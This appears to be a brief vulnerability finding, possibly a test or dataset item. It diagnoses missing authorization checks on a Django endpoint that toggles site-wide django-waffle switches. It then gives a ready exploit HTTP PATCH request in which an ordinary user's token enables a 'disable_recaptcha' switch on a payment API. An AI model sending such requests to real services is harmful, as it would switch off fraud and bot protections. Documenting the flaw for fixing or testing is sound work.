diagnosis: toggle_runtime_switch allows any authenticated user to toggle system-wide django-waffle Switch instances by name. Because it lacks role checks for is_staff or waffle permissions, an ordinary user can disable system maintenance modes, disable fraud inspection switches, or toggle global payment switches.
exploit_request:
PATCH /api/feature-switches/disable_recaptcha/ HTTP/1.1
Host: api.globalpay.com
Authorization: Bearer attacker_token
Content-Type: application/json

{
  "active": true
}
